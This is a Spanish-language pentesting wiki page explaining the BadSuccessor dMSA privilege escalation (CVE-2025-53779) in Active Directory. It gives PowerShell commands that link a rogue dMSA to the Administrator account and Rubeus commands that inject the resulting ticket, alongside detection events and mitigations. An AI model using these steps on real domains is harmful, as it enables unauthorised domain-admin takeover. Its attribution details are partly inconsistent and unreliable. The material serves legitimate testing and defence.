# BadSuccessor: Escalada de privilegios mediante el abuso de la migración de MSA delegada

{{#include ../../banners/hacktricks-training.md}}

## Descripción general

Las Managed Service Accounts delegadas (**dMSA**) son las sucesoras de nueva generación de las **gMSA** que se incluyen en Windows Server 2025. Un flujo de migración legítimo permite a los administradores reemplazar una cuenta *antigua* (cuenta de usuario, equipo o servicio) por una dMSA, conservando los permisos de forma transparente. El flujo se expone mediante cmdlets de PowerShell como `Start-ADServiceAccountMigration` y `Complete-ADServiceAccountMigration`, y depende de dos atributos LDAP del **objeto dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *enlace DN* a la cuenta reemplazada (antigua).
* **`msDS-DelegatedMSAState`**       – estado de migración (`0` = ninguno, `1` = en progreso, `2` = *completada*).<sup>[[1]](#references)</sup>

Si un atacante puede crear cualquier dMSA dentro de una OU y manipular directamente esos 2 atributos, LSASS y el KDC tratarán la dMSA como la *sucesora* de la cuenta enlazada. Cuando posteriormente el atacante se autentique como la dMSA, **heredará todos los privilegios de la cuenta enlazada**, hasta **Domain Admin** si se enlaza la cuenta Administrator.<sup>[[1]](#references)</sup>

Esta técnica fue denominada **BadSuccessor** por Unit 42 en 2025. Posteriormente, Microsoft le asignó **CVE-2025-53779** y publicó una actualización de seguridad en **agosto de 2025**. La técnica sigue siendo relevante en entornos Windows Server 2025 sin parches y para revisar delegaciones peligrosas de OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Requisitos previos del ataque

1. Una cuenta que tenga permitido crear objetos dentro de **una Organizational Unit (OU)** y que tenga al menos uno de los siguientes permisos:
* `Create Child` → clase de objeto **`msDS-DelegatedManagedServiceAccount`**
* `Create Child` → **`All Objects`** (creación genérica)
2. Conectividad de red con LDAP y Kerberos (escenario estándar de un equipo unido al dominio / ataque remoto).<sup>[[1]](#references)</sup>

## Enumeración de OUs vulnerables

Unit 42 publicó un script auxiliar de PowerShell que analiza los descriptores de seguridad de cada OU y destaca las ACE necesarias:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
En segundo plano, el script ejecuta una búsqueda LDAP paginada para `(objectClass=organizationalUnit)` y comprueba cada `nTSecurityDescriptor` en busca de

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Pasos de explotación

Una vez identificado un OU con permisos de escritura, el ataque requiere solo 3 escrituras LDAP:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Tras la replicación, el atacante puede simplemente **logon** como `attacker_dMSA$` o solicitar un Kerberos TGT: Windows construirá el token de la cuenta *reemplazada*.<sup>[[1]](#references)</sup>

### Automatización

Varios PoC públicos envuelven todo el flujo de trabajo, incluida la recuperación de contraseñas y la gestión de tickets:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Módulo de NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detección y Hunting

Habilita la **auditoría de objetos** en las OUs y monitoriza los siguientes eventos de seguridad de Windows:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Creación del objeto **dMSA**
* **5136** – Modificación de **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Cambios específicos de atributos
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Emisión de TGT para el dMSA

Correlacionar `4662` (modificación de atributos), `4741` (creación de una cuenta de equipo/servicio) y `4624` (inicio de sesión posterior) permite identificar rápidamente la actividad de BadSuccessor. Las soluciones XDR, como **XSIAM**, incluyen queries listas para usar (consulta las referencias).<sup>[[2]](#references)</sup>

## Mitigación

* Aplica la actualización de seguridad de Microsoft para **CVE-2025-53779** y verifica el nivel de parche de cada controlador de dominio de Windows Server 2025.<sup>[[6]](#references)</sup>
* Aplica el principio de **mínimo privilegio**: delega la gestión de *Service Account* únicamente a roles de confianza.
* Elimina `Create Child` / `msDS-DelegatedManagedServiceAccount` de las OUs que no lo requieran explícitamente.
* Monitoriza los ID de evento indicados anteriormente y genera alertas cuando identidades *non-Tier-0* creen o editen dMSAs.

## Ver también


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Abusando de dMSA para escalar privilegios en Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Cuando las buenas cuentas se vuelven malas: explotación de Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Colección de herramientas de Pentest](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Módulo de BadSuccessor para NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Centro de respuesta de seguridad de Microsoft – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
